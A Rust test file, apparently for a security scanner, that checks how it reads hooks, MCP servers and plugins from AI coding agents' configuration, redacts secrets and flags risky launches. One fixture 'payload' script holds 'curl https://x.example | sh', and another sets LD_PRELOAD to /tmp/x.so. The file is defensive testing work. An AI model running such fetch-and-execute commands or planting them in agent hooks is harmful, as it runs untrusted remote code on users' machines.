//! Tests of reading what AI coding agents start out of their configuration.

use std::collections::HashSet;
use std::fs;
use std::os::unix::fs::symlink;
use std::path::Path;

use super::*;
use crate::sweep::collect::Origin;
use crate::sweep::index::PackageIndex;
use crate::test_support::TempDir;

fn write(root: &Path, path: &str, text: &str) {
    fs::create_dir_all(root.join(path).parent().unwrap()).unwrap();
    fs::write(root.join(path), text).unwrap();
}

/// What the agents' configuration under `root` gives, for the home
/// `home/u` with the default directories.
fn found_in(root: &Path) -> Found {
    let index = PackageIndex::with_foreign(HashSet::new());
    let scope = Scope {
        root,
        home: Some("home/u"),
        index: &index,
        origin: Origin::System,
    };
    let mut found = Found::default();
    let dirs = Dirs::new("home/u", &|_| None);
    claude::collect(&scope, Some(&dirs), &mut found);
    opencode::collect(&scope, &dirs, &mut found);
    codex::collect(&scope, &dirs.codex, &mut found);
    found
}

fn text(item: &Item) -> &str {
    match &item.body {
        Body::Text(text) => text,
        other => panic!("{} has no text: {other:?}", item.path),
    }
}

/// The item at `path`, which must be there.
fn at<'a>(found: &'a Found, path: &str) -> &'a Item {
    found
        .items
        .iter()
        .find(|item| item.path == path)
        .unwrap_or_else(|| {
            let paths: Vec<&str> = found.items.iter().map(|item| item.path.as_str()).collect();
            panic!("no item {path} in {paths:?}")
        })
}

#[test]
fn claude_settings_give_an_item_for_each_hook_status_line_and_helper() {
    let dir = TempDir::new("agents-claude-settings");
    let root = dir.path();
    write(
        root,
        "home/u/.claude/settings.json",
        r#"{
          "model": "opus",
          "env": {"ANTHROPIC_API_KEY": "sk-ant-secret-1"},
          "hooks": {
            "PreToolUse": [
              {"matcher": "Bash", "hooks": [
                {"type": "command", "command": "~/.claude/hooks/guard.sh \"$CLAUDE_PROJECT_DIR\""},
                {"type": "prompt", "prompt": "Is this safe?"}
              ]},
              {"matcher": "Edit|Write", "hooks": [{"type": "command", "command": "npx -y formatter"}]}
            ],
            "Stop": [{"hooks": [{"type": "http", "url": "https://u:pw@hooks.example.com/x?token=abc"}]}],
            "Weird/Event\n": [{"hooks": [{"command": "true"}]}]
          },
          "statusLine": {"type": "command", "command": "bash ~/.claude/statusline.sh"},
          "apiKeyHelper": "/usr/local/bin/get-key"
        }"#,
    );
    write(
        root,
        "home/u/.claude/settings.local.json",
        r#"{"hooks": {"SessionStart": [{"hooks": [{"type": "command", "command": "echo hi"}]}]}}"#,
    );
    let found = found_in(root);
    assert_eq!(found.unchecked, Vec::<String>::new());

    let guard = at(&found, "home/u/.claude/settings.json#hooks/PreToolUse/0/0");
    assert_eq!(
        text(guard),
        "~/.claude/hooks/guard.sh \"$CLAUDE_PROJECT_DIR\"\n"
    );
    assert_eq!(
        guard.runs,
        ["~/.claude/hooks/guard.sh \"$CLAUDE_PROJECT_DIR\""]
    );
    assert_eq!(guard.category, Category::Agent);
    assert_eq!(guard.origin, Origin::User);
    assert_eq!(guard.tier, Tier::Unknown);
    assert_eq!(guard.sha256, Some(Sha256::digest(text(guard).as_bytes())));
    // A prompt hook asks a model and starts nothing.
    assert!(
        found
            .items
            .iter()
            .all(|item| !item.path.ends_with("PreToolUse/0/1"))
    );
    at(&found, "home/u/.claude/settings.json#hooks/PreToolUse/1/0");
    at(&found, "home/u/.claude/settings.json#statusLine");
    at(&found, "home/u/.claude/settings.json#apiKeyHelper");
    at(
        &found,
        "home/u/.claude/settings.local.json#hooks/SessionStart/0/0",
    );

    // A web hook is its scheme and host, and an alert.
    let web = at(&found, "home/u/.claude/settings.json#hooks/Stop/0/0");
    assert_eq!(text(web), "https://hooks.example.com\n");
    assert!(web.runs.is_empty());
    assert_eq!(web.alerts.len(), 1);
    assert_eq!(web.alerts[0].0, RuleId::RiskyConfiguration);

    // An event name that is no plain name is named by its digest.
    let odd: Vec<&Item> = found
        .items
        .iter()
        .filter(|item| text(item) == "true\n")
        .collect();
    assert_eq!(odd.len(), 1);
    assert!(odd[0].path.contains("#hooks/~"), "{}", odd[0].path);
    assert!(!odd[0].path.contains('\n'));

    // Nothing else of the file is in any item.
    for item in &found.items {
        assert!(!text(item).contains("sk-ant-secret-1"));
        assert!(!text(item).contains("opus"));
        assert!(!text(item).contains("pw"));
        assert!(!text(item).contains("token=abc"));
    }
}

#[test]
fn claude_json_gives_only_its_servers_and_hides_projects_and_secrets() {
    let dir = TempDir::new("agents-claude-json");
    let root = dir.path();
    write(
        root,
        "home/u/.claude.json",
        r#"{
          "oauthAccount": {"emailAddress": "someone@example.com", "accessToken": "tok-123"},
          "mcpServers": {
            "github": {
              "command": "docker",
              "args": ["run", "-e", "GITHUB_TOKEN=ghp_literal", "--api-key", "sk-live-9",
                       "--url=https://bob:hunter2@api.example.com/v1", "image name"],
              "env": {"GITHUB_TOKEN": "ghp_in_env", "LD_PRELOAD": "/tmp/x.so"}
            },
            "docs": {"type": "http", "url": "https://mcp.example.com/mcp?key=abc"},
            "local": {"type": "sse", "url": "http://localhost:3000/sse"},
            "empty": {}
          },
          "projects": {
            "/home/u/work/secret-project": {
              "history": [{"display": "my private prompt"}],
              "mcpServers": {"db": {"command": "uvx", "args": ["db-server"]}}
            }
          }
        }"#,
    );
    let found = found_in(root);
    assert_eq!(found.unchecked, Vec::<String>::new());

    let github = at(&found, "home/u/.claude.json#mcpServers/github");
    assert_eq!(
        text(github),
        "# started with these variables set (values not read): GITHUB_TOKEN LD_PRELOAD\n\
         docker run -e 'GITHUB_TOKEN=<value-not-read>' --api-key '<value-not-read>' \
         --url=https://api.example.com/v1 'image name'\n"
    );
    let docs = at(&found, "home/u/.claude.json#mcpServers/docs");
    assert_eq!(text(docs), "https://mcp.example.com\n");
    assert_eq!(docs.alerts[0].0, RuleId::RiskyConfiguration);
    let local = at(&found, "home/u/.claude.json#mcpServers/local");
    assert_eq!(text(local), "http://localhost:3000\n");
    assert!(local.alerts.is_empty());
    assert!(
        found
            .items
            .iter()
            .all(|item| !item.path.ends_with("/empty"))
    );

    // A project is named by a digest of its path; only the note, which
    // stays here, names it.
    let project = found
        .items
        .iter()
        .find(|item| item.path.ends_with("/mcpServers/db"))
        .unwrap();
    let digest = &Sha256::digest(b"/home/u/work/secret-project").to_string()[..12];
    assert_eq!(
        project.path,
        format!("home/u/.claude.json#projects/~{digest}/mcpServers/db")
    );
    assert_eq!(text(project), "uvx db-server\n");
    assert_eq!(
        project.notes,
        ["an MCP server of the project /home/u/work/secret-project"]
    );

    for item in &found.items {
        for kept in [
            "tok-123",
            "someone@example.com",
            "ghp_",
            "sk-live-9",
            "hunter2",
            "bob",
            "/tmp/x.so",
            "secret-project",
            "private prompt",
            "key=abc",
        ] {
            assert!(!text(item).contains(kept), "{kept} in {}", item.path);
            assert!(!item.path.contains(kept), "{kept} in {}", item.path);
        }
    }
}

#[test]
fn a_changed_entry_changes_its_digest_and_a_changed_secret_does_not() {
    let config = |token: &str, extra: &str| {
        format!(
            r#"{{"mcpServers": {{"s": {{"command": "srv", "args": ["--token", "{token}"], "env": {{"A": "{token}"{extra}}}}}}}}}"#
        )
    };
    let digest = |text: &str| {
        let dir = TempDir::new("agents-digest");
        write(dir.path(), "home/u/.claude.json", text);
        let found = found_in(dir.path());
        assert_eq!(found.items.len(), 1);
        found.items[0].sha256
    };
    let before = digest(&config("one", ""));
    assert_eq!(before, digest(&config("two", "")));
    assert_ne!(before, digest(&config("one", r#", "B": "x""#)));
}

#[test]
fn a_plugin_is_read_through_its_install_and_its_scripts_are_followed() {
    let dir = TempDir::new("agents-plugins");
    let root = dir.path();
    let cache = "home/u/.claude/plugins/cache/market/guard/1.0.0";
    write(
        root,
        "home/u/.claude/plugins/installed_plugins.json",
        &format!(
            r#"{{"version": 2, "plugins": {{
              "guard@market": [{{"scope": "user", "installPath": "/{cache}", "version": "1.0.0"}}],
              "stray@market": [{{"installPath": "/home/u/elsewhere/stray"}}],
              "bare@market": [{{"installPath": "/home/u/.claude/plugins/cache/market/bare/2"}}]
            }}}}"#
        ),
    );
    write(
        root,
        &format!("{cache}/hooks/hooks.json"),
        r#"{"description": "d", "hooks": {"SessionStart": [{"hooks": [
            {"type": "command", "command": "bash \"${CLAUDE_PLUGIN_ROOT}/hooks/start.sh\" $CLAUDE_PLUGIN_ROOT_X"}
        ]}]}}"#,
    );
    write(
        root,
        &format!("{cache}/.claude-plugin/plugin.json"),
        r#"{"name": "guard",
            "mcpServers": {"helper": {"command": "${CLAUDE_PLUGIN_ROOT}/bin/helper"}},
            "hooks": ["./hooks/hooks.json", "../../outside.json", "./more.json"]}"#,
    );
    write(
        root,
        &format!("{cache}/more.json"),
        r#"{"hooks": {"Stop": [{"hooks": [{"command": "$CLAUDE_PLUGIN_ROOT/stop"}]}]}}"#,
    );
    let found = found_in(root);
    let list = "home/u/.claude/plugins/installed_plugins.json";

    let start = at(
        &found,
        &format!("{list}#guard@market/hooks/hooks.json/SessionStart/0/0"),
    );
    assert_eq!(
        text(start),
        "bash \"${CLAUDE_PLUGIN_ROOT}/hooks/start.sh\" $CLAUDE_PLUGIN_ROOT_X\n"
    );
    assert_eq!(
        start.runs,
        [format!(
            "bash \"/{cache}/hooks/start.sh\" $CLAUDE_PLUGIN_ROOT_X"
        )]
    );
    assert_eq!(
        start.notes,
        ["of the Claude Code plugin guard@market (version 1.0.0)"]
    );
    let helper = at(
        &found,
        &format!("{list}#guard@market/.claude-plugin/plugin.json/mcpServers/helper"),
    );
    assert_eq!(helper.runs, [format!("/{cache}/bin/helper")]);
    let stop = at(&found, &format!("{list}#guard@market/more.json/Stop/0/0"));
    assert_eq!(stop.runs, [format!("/{cache}/stop")]);
    // The default hooks file the manifest names again is read once.
    let starts = found
        .items
        .iter()
        .filter(|item| item.path.contains("SessionStart"))
        .count();
    assert_eq!(starts, 1);

    assert_eq!(found.unchecked.len(), 2, "{:?}", found.unchecked);
    assert!(found.unchecked[0].contains("outside its plugin (../../outside.json)"));
    assert!(found.unchecked[1].contains("the plugin stray@market is not installed in"));
}

#[test]
fn what_cannot_be_read_is_said_and_gives_no_item() {
    let dir = TempDir::new("agents-unreadable");
    let root = dir.path();
    write(
        root,
        "home/u/dotfiles/settings.json",
        r#"{"statusLine": {"command": "x"}}"#,
    );
    fs::create_dir_all(root.join("home/u/.claude")).unwrap();
    symlink(
        "../dotfiles/settings.json",
        root.join("home/u/.claude/settings.json"),
    )
    .unwrap();
    write(root, "home/u/.claude/settings.local.json", "{\"hooks\": ");
    write(
        root,
        "home/u/.codex/config.toml",
        "[mcp_servers.x\ncommand = 1\n",
    );
    fs::create_dir_all(root.join("home/u/.config/opencode/opencode.json")).unwrap();
    let huge = fs::File::create(root.join("home/u/.claude.json")).unwrap();
    huge.set_len(MAX_CONFIG + 1).unwrap();
    let found = found_in(root);
    assert_eq!(found.items, Vec::new());
    let said = found.unchecked.join("\n");
    for expected in [
        "/home/u/.claude/settings.json: a link, which is not followed; what it starts was not checked",
        "/home/u/.claude/settings.local.json: not JSON",
        "/home/u/.claude.json: larger than 16 MiB",
        "/home/u/.codex/config.toml: not TOML Guardian can read",
        "/home/u/.config/opencode/opencode.json: not a regular file",
    ] {
        assert!(said.contains(expected), "{expected} not in {said}");
    }
    assert_eq!(found.unchecked.len(), 5, "{said}");
}

#[test]
fn opencode_servers_and_plugins_are_read_from_jsonc_and_its_plugin_directories() {
    let dir = TempDir::new("agents-opencode");
    let root = dir.path();
    write(
        root,
        "home/u/.config/opencode/opencode.jsonc",
        r#"{
          // the model, with a "string // that is not a comment"
          "model": "a/b // c",
          /* servers */
          "mcp": {
            "fs": {"type": "local", "command": ["npx", "-y", "@scope/fs-server"], "environment": {"TOKEN": "t-1"},},
            "web": {"type": "remote", "url": "https://mcp.example.org/x", "headers": {"Authorization": "Bearer b-1"}},
          },
          "plugin": ["opencode-a", "opencode-b@1.2.3", "opencode-c@latest", "file:///home/u/my plugin.js", 7],
        }"#,
    );
    write(
        root,
        "home/u/.config/opencode/plugin/notify.ts",
        "export const x = 1\n",
    );
    write(
        root,
        "home/u/.config/opencode/plugins/other.js",
        "export const y = 2\n",
    );
    write(root, "home/u/.config/opencode/plugin/README.md", "docs\n");
    write(
        root,
        "home/u/.config/opencode/plugin/node_modules/z/index.js",
        "z\n",
    );
    let found = found_in(root);
    assert_eq!(found.unchecked, Vec::<String>::new());
    let file = "home/u/.config/opencode/opencode.jsonc";

    let fs = at(&found, &format!("{file}#mcp/fs"));
    assert_eq!(
        text(fs),
        "# started with these variables set (values not read): TOKEN\nnpx -y @scope/fs-server\n"
    );
    let web = at(&found, &format!("{file}#mcp/web"));
    assert_eq!(text(web), "https://mcp.example.org\n");
    assert_eq!(web.alerts[0].0, RuleId::RiskyConfiguration);

    let alerted = |index: usize| {
        let plugin = at(&found, &format!("{file}#plugin/{index}"));
        plugin
            .alerts
            .iter()
            .any(|(rule, _)| *rule == RuleId::RemoteCodeInstall)
    };
    assert_eq!(
        text(at(&found, &format!("{file}#plugin/0"))),
        "npm package opencode-a\n"
    );
    assert!(alerted(0));
    assert!(!alerted(1));
    assert!(alerted(2));
    let local = at(&found, &format!("{file}#plugin/3"));
    assert_eq!(local.runs, ["'/home/u/my plugin.js'"]);
    assert!(local.alerts.is_empty());
    assert!(
        found
            .items
            .iter()
            .all(|item| !item.path.ends_with("plugin/4"))
    );

    let files: Vec<&str> = found
        .items
        .iter()
        .filter(|item| item.path.contains("/plugin") && !item.path.contains('#'))
        .map(|item| item.path.as_str())
        .collect();
    assert_eq!(
        files,
        [
            "home/u/.config/opencode/plugin/notify.ts",
            "home/u/.config/opencode/plugins/other.js"
        ]
    );
    let plugin = at(&found, "home/u/.config/opencode/plugin/notify.ts");
    assert_eq!(plugin.category, Category::Agent);
    assert_eq!(text(plugin), "export const x = 1\n");
    assert!(plugin.runs.is_empty());
    for item in &found.items {
        for kept in ["t-1", "b-1", "a/b"] {
            assert!(!text(item).contains(kept), "{kept} in {}", item.path);
        }
    }
}

#[test]
fn codex_servers_and_notify_are_read_from_its_toml() {
    let dir = TempDir::new("agents-codex");
    let root = dir.path();
    write(
        root,
        "home/u/.codex/config.toml",
        r#"
model = "gpt"
notify = ["python3", "/home/u/.codex/notify.py"]

[mcp_servers.search]
command = "npx"
args = ["-y", "search-mcp"]
env = { "API_KEY" = "k-1", REGION = "eu" }

[mcp_servers.search.env]
EXTRA = "e-1"

[mcp_servers."odd name"]
url = "https://user:pw@remote.example.net/mcp"

[mcp_servers.nothing]
startup_timeout_sec = 5
"#,
    );
    let found = found_in(root);
    assert_eq!(found.unchecked, Vec::<String>::new());
    let file = "home/u/.codex/config.toml";
    let notify = at(&found, &format!("{file}#notify"));
    assert_eq!(notify.runs, ["python3 /home/u/.codex/notify.py"]);
    let search = at(&found, &format!("{file}#mcp_servers/search"));
    assert_eq!(
        text(search),
        "# started with these variables set (values not read): API_KEY REGION EXTRA\nnpx -y search-mcp\n"
    );
    let odd = found
        .items
        .iter()
        .find(|item| text(item) == "https://remote.example.net\n")
        .unwrap();
    assert!(odd.path.starts_with(&format!("{file}#mcp_servers/~")));
    assert_eq!(found.items.len(), 3);
    for item in &found.items {
        for kept in ["k-1", "e-1", "eu", "pw", "gpt"] {
            assert!(!text(item).contains(kept), "{kept} in {}", item.path);
        }
    }
}

#[test]
fn the_managed_files_are_read_without_a_home() {
    let dir = TempDir::new("agents-managed");
    let root = dir.path();
    write(
        root,
        "etc/claude-code/managed-settings.json",
        r#"{"hooks": {"PreToolUse": [{"hooks": [{"command": "/usr/local/bin/audit"}]}]}}"#,
    );
    write(
        root,
        "etc/claude-code/managed-mcp.json",
        r#"{"mcpServers": {"corp": {"command": "/opt/corp/mcp"}}}"#,
    );
    let index = PackageIndex::with_foreign(HashSet::new());
    let scope = Scope {
        root,
        home: None,
        index: &index,
        origin: Origin::Root,
    };
    let found = collect(&scope);
    let paths: Vec<&str> = found.items.iter().map(|item| item.path.as_str()).collect();
    assert_eq!(
        paths,
        [
            "etc/claude-code/managed-settings.json#hooks/PreToolUse/0/0",
            "etc/claude-code/managed-mcp.json#mcpServers/corp"
        ]
    );
    assert!(found.items.iter().all(|item| item.origin == Origin::Root));
}

#[test]
fn the_sweep_follows_what_a_hook_and_a_plugin_run() {
    let dir = TempDir::new("agents-followed");
    let root = dir.path();
    write(
        root,
        "home/u/.claude/settings.json",
        r#"{"hooks": {"Stop": [{"hooks": [{"command": "echo start && ~/.claude/hooks/stop.sh"}]}]}}"#,
    );
    write(
        root,
        "home/u/.claude/hooks/stop.sh",
        "#!/bin/sh\n/home/u/.local/share/x/payload\n",
    );
    write(
        root,
        "home/u/.local/share/x/payload",
        "#!/bin/sh\ncurl https://x.example | sh\n",
    );
    let cache = "home/u/.claude/plugins/cache/m/p/1";
    write(
        root,
        "home/u/.claude/plugins/installed_plugins.json",
        &format!(r#"{{"plugins": {{"p@m": [{{"installPath": "/{cache}"}}]}}}}"#),
    );
    write(
        root,
        &format!("{cache}/hooks/hooks.json"),
        r#"{"hooks": {"PostToolUse": [{"hooks": [{"command": "${CLAUDE_PLUGIN_ROOT}/run.sh"}]}]}}"#,
    );
    write(root, &format!("{cache}/run.sh"), "#!/bin/sh\necho plugin\n");
    let index = PackageIndex::with_foreign(HashSet::new());
    let collection = collect::collect(&Scope {
        root,
        home: Some("home/u"),
        index: &index,
        origin: Origin::System,
    });
    let run_by = |path: &str| {
        collection
            .items
            .iter()
            .find(|item| item.path == path)
            .unwrap_or_else(|| panic!("{path} was not collected"))
            .run_by
            .clone()
    };
    assert_eq!(
        run_by("home/u/.claude/hooks/stop.sh").as_deref(),
        Some("home/u/.claude/settings.json#hooks/Stop/0/0")
    );
    assert_eq!(
        run_by("home/u/.local/share/x/payload").as_deref(),
        Some("home/u/.claude/hooks/stop.sh")
    );
    assert_eq!(
        run_by(&format!("{cache}/run.sh")).as_deref(),
        Some("home/u/.claude/plugins/installed_plugins.json#p@m/hooks/hooks.json/PostToolUse/0/0")
    );
}

#[test]
fn the_environment_moves_each_agents_directory() {
    let defaults = Dirs::new("home/u", &|_| None);
    assert_eq!(
        defaults,
        Dirs {
            claude: "home/u/.claude".into(),
            claude_json: "home/u/.claude.json".into(),
            opencode: "home/u/.config/opencode".into(),
            opencode_config: None,
            codex: "home/u/.codex".into(),
        }
    );
    let moved = Dirs::new("home/u", &|name| {
        Some(
            match name {
                "CLAUDE_CONFIG_DIR" => "srv/claude",
                "XDG_CONFIG_HOME" => "home/u/conf",
                "OPENCODE_CONFIG" => "home/u/oc.json",
                "CODEX_HOME" => "opt/codex",
                other => panic!("asked for {other}"),
            }
            .to_string(),
        )
    });
    assert_eq!(
        moved,
        Dirs {
            claude: "srv/claude".into(),
            claude_json: "srv/claude/.claude.json".into(),
            opencode: "home/u/conf/opencode".into(),
            opencode_config: Some("home/u/oc.json".into()),
            codex: "opt/codex".into(),
        }
    );
    assert_eq!(relative("/srv/claude/").as_deref(), Some("srv/claude"));
    for odd in ["", "/", "relative/dir", "/a/../b", "/a//b", "/./a"] {
        assert_eq!(relative(odd), None, "{odd}");
    }
}

#[test]
fn keys_are_plain_or_a_digest_and_never_two_parts() {
    assert_eq!(key_part("PreToolUse"), "PreToolUse");
    assert_eq!(key_part("guard@market"), "guard@market");
    let odd = [
        "a/b",
        "a\nb",
        "",
        ".hidden",
        "with space",
        "#hash",
        &"x".repeat(65),
    ];
    let parts: HashSet<String> = odd.iter().map(|name| key_part(name)).collect();
    assert_eq!(parts.len(), odd.len());
    for part in parts {
        assert!(part.starts_with('~') && part.len() == 13, "{part}");
    }
}

#[test]
fn jsonc_loses_comments_and_trailing_commas_and_keeps_strings() {
    let text =
        "{\"a\": \"// no /* no */\", // yes\n\"b\": [1, 2, /* x */ ],\n\"c\": \"\\\"//\\\"\",\n}";
    assert_eq!(
        Json::parse(&without_comments(text)).unwrap(),
        Json::parse(r#"{"a": "// no /* no */", "b": [1, 2], "c": "\"//\""}"#).unwrap()
    );
    // An unclosed comment swallows the rest, which then is no JSON.
    assert!(Json::parse(&without_comments("{\"a\": 1 /* open")).is_err());
}

#[test]
fn command_lines_quote_what_a_shell_would_split_and_take_out_secrets() {
    let line = |program: &str, args: &[&str]| {
        let args: Vec<String> = args.iter().map(|arg| (*arg).to_string()).collect();
        command_line(program, &args)
    };
    assert_eq!(
        line("node", &["${HOME}/x.js", "--port=3"]),
        "node ${HOME}/x.js --port=3"
    );
    assert_eq!(line("my tool", &["it's"]), r"'my tool' 'it'\''s'");
    assert_eq!(line("x", &[""]), "x ''");
    assert_eq!(
        line("x", &["--password", "p", "--keymap", "k", "--auth-token=t"]),
        "x --password '<value-not-read>' --keymap k '--auth-token=<value-not-read>'"
    );
    assert_eq!(
        line("x", &["git+https://me:s3cret@git.example/r.git"]),
        "x git+https://git.example/r.git"
    );
    assert_eq!(line("x", &["mail=a@b.example"]), "x mail=a@b.example");
}

#[test]
fn the_plugin_directory_is_written_in_only_for_its_own_variable() {
    let root = Some("home/u/p");
    assert_eq!(
        with_plugin_root(
            "${CLAUDE_PLUGIN_ROOT}/a $CLAUDE_PLUGIN_ROOT/b $CLAUDE_PLUGIN_ROOTS",
            root
        ),
        "/home/u/p/a /home/u/p/b $CLAUDE_PLUGIN_ROOTS"
    );
    assert_eq!(with_plugin_root("$CLAUDE_PLUGIN_ROOT", root), "/home/u/p");
    assert_eq!(
        with_plugin_root("${CLAUDE_PLUGIN_ROOT}/a", None),
        "${CLAUDE_PLUGIN_ROOT}/a"
    );
}

#[test]
fn a_package_is_pinned_only_by_one_version() {
    for pinned in ["a@1.2.3", "@scope/a@1.0.0-rc.1", "a@2.0.0+build"] {
        assert!(is_pinned(pinned), "{pinned}");
    }
    for unpinned in [
        "a",
        "@scope/a",
        "a@latest",
        "a@^1.2.0",
        "a@~1",
        "a@",
        "a@1.x || 2",
    ] {
        assert!(!is_pinned(unpinned), "{unpinned}");
    }
}

#[test]
fn a_remote_address_is_its_scheme_and_host() {
    let host = |url: &str| match remote(url) {
        Launch::Remote { scheme, host } => format!("{scheme}://{host}"),
        other => panic!("{other:?}"),
    };
    assert_eq!(
        host("HTTPS://User:Pw@Example.COM:8443/p?q#f"),
        "https://example.com:8443"
    );
    assert_eq!(host("example.com/x"), "://example.com");
    assert_eq!(host("http://[::1]:8080/sse"), "http://[::1]:8080");
    assert_eq!(without_port("[::1]:8080"), "[::1]");
    assert_eq!(without_port("localhost:3000"), "localhost");
    assert_eq!(without_port("::1"), "::1");
}
